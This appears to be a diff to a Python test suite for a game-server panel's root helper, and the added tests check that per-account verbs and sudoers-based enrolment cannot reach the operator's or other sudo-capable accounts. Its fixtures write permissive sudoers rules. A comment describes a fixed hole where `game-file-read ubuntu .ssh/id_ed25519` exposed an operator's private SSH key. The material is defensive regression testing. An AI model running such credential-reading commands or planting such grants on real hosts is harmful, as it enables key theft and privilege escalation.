+        _fh.write("User_Alias OPS = alice, bob\nOPS ALL=(ALL) ALL\nalice, bob ALL=(ALL) ALL\n"
+                  "#999 ALL=(ALL) ALL\n%#999 ALL=(ALL) ALL\n%admins ALL=(ALL) ALL\n"
+                  "Cmnd_Alias SHUT = /sbin/shutdown : REB = /sbin/reboot\n"
+                  "Defaults:alice !requiretty\n#includedir-style comment deploy\n"
+                  "lgsmpanel ALL=(%lgsmpanel-games) NOPASSWD: ALL\n")
+    check("enrolment: ...and rules naming other accounts still let a plain account in",
+          _helper._can_already_escalate("deploy") is False)
 
     # The verb must consult it, not merely define it.
     _ran = []
     _sub_saved = _helper.subprocess
     try:
         _helper.subprocess = NS(run=lambda *a, **k: (_ran.append(a), NS(returncode=0, stderr=b""))[1])
-        _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("users"),
-                         getgrall=lambda: [_FakeGrp("sudo", ["carol"])])
+        _helper.grp = _fake_grp(lambda _g: _FakeGrp("users"),
+                                lambda: [_FakeGrp("sudo", ["carol"])])
         _rc_bad = _helper.do_gameuser_group(["carol"], "")
         check("enrolment: do_gameuser_group REFUSES a sudo-capable account",
               _rc_bad == 1 and not _ran, "rc=%s ran=%s" % (_rc_bad, _ran))
         _ran.clear()
-        _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("gmodserver"), getgrall=lambda: [])
+        _helper.grp = _fake_grp(lambda _g: _FakeGrp("gmodserver"), lambda: [])
         _rc_ok = _helper.do_gameuser_group(["gmodserver"], "")
         check("enrolment: ...and still enrols a plain game account",
               _rc_ok == 0 and len(_ran) == 2, "rc=%s ran=%s" % (_rc_ok, _ran))
@@ -3537,6 +3902,125 @@ try:
     _shutil.rmtree(_sg_dir, ignore_errors=True)
 finally:
     _helper.grp, _helper.pwd, _helper.glob = _grp_saved, _pwd_saved, _glob_saved
+    _helper.SUDOERS_FILE, _helper.SUDOERS_DIR = _sudoers_saved
+    _shutil.rmtree(_sg_root, ignore_errors=True)
+
+# ── ...and the per-account verbs only act on accounts inside that grant ──────────────────────
+# The sudoers design bounds "accounts the panel may become" with the %lgsmpanel-games Runas group,
+# and the check above keeps sudo-capable accounts out of it. But every per-account verb validated
+# its name with v_managed_user, which refuses uid 0 and nothing else — so `game-file-read ubuntu
+# .ssh/id_ed25519` dropped to the operator's account and handed its private key to the panel user,
+# lgsm-command ran that account's scripts as it, and the destroy verbs would `userdel -r` it. Driven
+# through validate(), the dispatcher's own check, with the invoking account set by SUDO_UID.
+_ga_verbs = ["content-dir-create", "content-game-present", "content-script-present",
+             "content-game-remove", "content-cron-write", "content-cron-remove",
+             "content-grant-read", "gmod-mount-read", "renice-users", "crontab-list",
+             "user-lock-password", "steam-dumps-sweep", "game-backup-read", "game-file-read",
+             "game-dir-tar", "lgsm-command", "user-delete", "user-delete-force",
+             "user-kill-processes", "user-remove-home"]
+_ga_users = {"lgsmpanel": 990, "ubuntu": 1000, "cssserver": 1001, "deployer": 1002, "alice": 1003}
+_ga_groups = {"sudo": ["ubuntu"], "lgsmpanel-games": ["cssserver"]}
+
+
+def _ga_pw(name):
+    if name not in _ga_users:
+        raise KeyError(name)
+    return NS(pw_name=name, pw_uid=_ga_users[name], pw_gid=_ga_users[name],
+              pw_dir="/nonexistent/" + name)
+
+
+def _ga_pwuid(uid):
+    for _n, _u in _ga_users.items():
+        if _u == uid:
+            return _ga_pw(_n)
+    raise KeyError(uid)
+
+
+def _ga_args(verb, who):
+    """The verb's sample arguments with every ACCOUNT slot naming `who`."""
+    _a = list(_VERB_SAMPLES[verb])
+    if verb == "renice-users":
+        return [_a[0], who]
+    if verb == "content-grant-read":
+        return [who, _a[1], who] + _a[3:]
+    return [who] + _a[1:]
+
+
+def _ga_refused(verb, who):
+    try:
+        _helper.validate(verb, _ga_args(verb, who))
+    except ValueError:
+        return True
+    return False
+
+
+_ga_saved = (_helper.pwd, _helper.grp, _helper.glob, _helper.SUDOERS_FILE, _helper.SUDOERS_DIR,
+             os.environ.get("SUDO_UID"))
+_ga_dir = _tempfile.mkdtemp(prefix="gameacct-")
+_ga_sudoers = os.path.join(_ga_dir, "sudoers")
+try:
+    _helper.pwd = NS(getpwnam=_ga_pw, getpwuid=_ga_pwuid)
+    _helper.grp = NS(getgrgid=lambda g: NS(gr_name=_ga_pwuid(g).pw_name, gr_gid=g, gr_mem=[]),
+                     getgrall=lambda: [NS(gr_name=k, gr_gid=5000 + i, gr_mem=v)
+                                       for i, (k, v) in enumerate(_ga_groups.items())],
+                     getgrnam=lambda n: NS(gr_name=n, gr_gid=_ga_users.get(n, 5000), gr_mem=[]))
+    _helper.glob = NS(glob=lambda _p: [])
+    _helper.SUDOERS_FILE, _helper.SUDOERS_DIR = _ga_sudoers, os.path.join(_ga_dir, "none")
+    # The hardened host: the narrow helper grant, the Runas-group grant, and the terminal's
+    # PASSWORD-required full grant — which a compromised panel process cannot use.
+    with open(_ga_sudoers, "w", encoding="utf-8") as _fh:
+        _fh.write("root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n"
+                  "lgsmpanel ALL=(root) NOPASSWD: /usr/local/lib/linuxgsm-panel/panel-helper\n"
+                  "lgsmpanel ALL=(%lgsmpanel-games) NOPASSWD: ALL\n"
+                  "lgsmpanel ALL=(ALL) ALL\n"
+                  "deployer ALL=(ALL) NOPASSWD:ALL\n")
+    os.environ["SUDO_UID"] = "990"
+    _ga_open = [v for v in _ga_verbs if not _ga_refused(v, "ubuntu")]
+    check("helper: no per-account verb acts on an account outside the game group (the operator's)",
+          not _ga_open, "accepted 'ubuntu' for: %s" % _ga_open)
+    _ga_shut = [v for v in _ga_verbs if _ga_refused(v, "cssserver")]
+    check("helper: ...while every one still takes a member of the game group (positive control)",
+          not _ga_shut, "refused 'cssserver' for: %s" % _ga_shut)
+    check("helper: ...and a name with no account yet is left to the verb's own lookup",
+          not _ga_refused("game-file-read", "nosuchuser"))
+    check("helper: ...and the invoking account itself (the single-box install) is still accepted",
+          not _ga_refused("crontab-list", "lgsmpanel") and not _ga_refused("game-file-read", "lgsmpanel"))
+    # Where the caller already reaches root without the helper there is no boundary to hold, and
+    # refusing would only break that host: a per-user install run by a sudo-group account, or one
+    # with a NOPASSWD rule for every command. No SUDO_UID at all is root invoking it directly.
+    os.environ["SUDO_UID"] = "1000"
+    check("helper: a caller in a privileged group is not held to the game group",
+          not _ga_refused("game-file-read", "alice"))
+    os.environ["SUDO_UID"] = "1002"
+    check("helper: ...nor one with a NOPASSWD rule for every command as root",
+          not _ga_refused("game-file-read", "alice"))
+    os.environ.pop("SUDO_UID", None)
+    check("helper: ...nor root invoking the helper directly", not _ga_refused("game-file-read", "alice"))
+    # content-grant-read: the content account's primary group is what the GMod account joins, so
+    # a root-equivalent one is refused, as privileged.py's _NEVER_A_CONTENT_GROUP already does.
+    _ga_ran = []
+    _ga_sub = _helper.subprocess
+    try:
+        _helper.subprocess = NS(run=lambda *a, **k: (_ga_ran.append(a[0]), NS(returncode=0))[1])
+        _helper.grp = NS(getgrgid=lambda g: NS(gr_name="docker", gr_gid=g, gr_mem=[]))
+        try:
+            _ga_rc = _helper.do_content_grant_read(["cssserver", "docker", "cssserver", "cstrike"], "")
+        except Exception as _e:        # got past the refusal and into the chmod walk
+            _ga_rc = repr(_e)
+    finally:
+        _helper.subprocess = _ga_sub
+    check("helper content-grant-read: a root-equivalent primary group is refused before usermod",
+          _ga_rc == 2 and not _ga_ran, "rc=%s ran=%s" % (_ga_rc, _ga_ran))
+finally:
+    (_helper.pwd, _helper.grp, _helper.glob, _helper.SUDOERS_FILE, _helper.SUDOERS_DIR,
+     _ga_sudo_uid) = _ga_saved
+    if _ga_sudo_uid is None:
+        os.environ.pop("SUDO_UID", None)
+    else:
+        os.environ["SUDO_UID"] = _ga_sudo_uid
+    _shutil.rmtree(_ga_dir, ignore_errors=True)
+check("helper: docker, lxd and disk count as root-equivalent for enrolment",
+      {"docker", "lxd", "disk"} <= set(_helper.PRIVILEGED_GROUPS))
 
 # install.sh must apply the same rule to the accounts it backfills.
 _inst_sh_src = open(os.path.join(_root, "install.sh"), encoding="utf-8").read()
@@ -3563,6 +4047,10 @@ check("install.sh: ...and the backfill acts on its answer, enrolling only on a d
 # function exists to enforce. CodeQL flagged the two `except: pass` clauses; the empty handler was
 # the visible half of that, not a style problem.
 _grp_saved2, _pwd_saved2, _glob_saved2 = _helper.grp, _helper.pwd, _helper.glob
+_sudoers_saved2 = (_helper.SUDOERS_FILE, _helper.SUDOERS_DIR)
+_sg2_dir = _tempfile.mkdtemp(prefix="sudoers-2-")
+with open(os.path.join(_sg2_dir, "sudoers"), "w", encoding="utf-8") as _fh:
+    _fh.write("root ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n")
 
 
 def _boom(*_a, **_k):
@@ -3570,6 +4058,10 @@ def _boom(*_a, **_k):
 
 
 try:
+    # A readable sandbox policy: the real /etc/sudoers is root-only, and an unreadable policy now
+    # counts as "can escalate" by itself, which would answer the last check below for it.
+    _helper.SUDOERS_FILE = os.path.join(_sg2_dir, "sudoers")
+    _helper.SUDOERS_DIR = os.path.join(_sg2_dir, "none")
     _helper.glob = NS(glob=lambda _p: [])
     _helper.pwd = NS(getpwnam=lambda _u: NS(pw_gid=1234, pw_uid=1234, pw_name=_u))
     _helper.grp = NS(getgrgid=lambda _g: _FakeGrp("gmodserver"), getgrall=_boom)
@@ -3588,6 +4080,8 @@ try:
           _helper._can_already_escalate("brandnew") is False)
 finally:
     _helper.grp, _helper.pwd, _helper.glob = _grp_saved2, _pwd_saved2, _glob_saved2
+    _helper.SUDOERS_FILE, _helper.SUDOERS_DIR = _sudoers_saved2
+    _shutil.rmtree(_sg2_dir, ignore_errors=True)
 
 # ── install_game_dependencies: step 3 of Install Server, and it was refused on a hardened host ──
 # It ran ONE `run_command(pipeline, sudo=True)`, which locally becomes `sudo bash -c '<pipeline>'`
